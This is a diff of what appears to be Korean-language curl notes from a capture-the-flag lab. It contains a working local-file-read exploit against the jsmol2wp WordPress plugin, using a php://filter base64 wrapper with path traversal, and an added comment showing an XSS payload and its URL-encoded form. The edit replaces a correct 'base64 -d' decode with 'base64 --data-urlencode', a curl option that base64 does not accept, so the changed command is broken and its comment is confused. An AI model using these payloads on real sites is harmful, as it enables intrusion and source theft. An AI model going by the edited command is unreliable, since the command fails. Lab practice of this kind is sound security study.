@@ -17,8 +17,10 @@ curl -I http://target.com             # 헤더만 요청 (HEAD 메소드)
 curl -i http://target.com             # 응답 본문과 헤더 함께 표시
 
 # 리디렉션으로 파일 저장 후 base64 디코딩
+# 자동으로 --data-urlencode 인코딩 -> <script>alert('XSS')</script> -> %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
+
 curl "http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/read=convert.base64-encode/resource=../../hello.php" > hello.b64
-base64 -d hello.b64 > hello.php
+base64 --data-urlencode hello.b64 > hello.php
 ```
 
 ## 인증
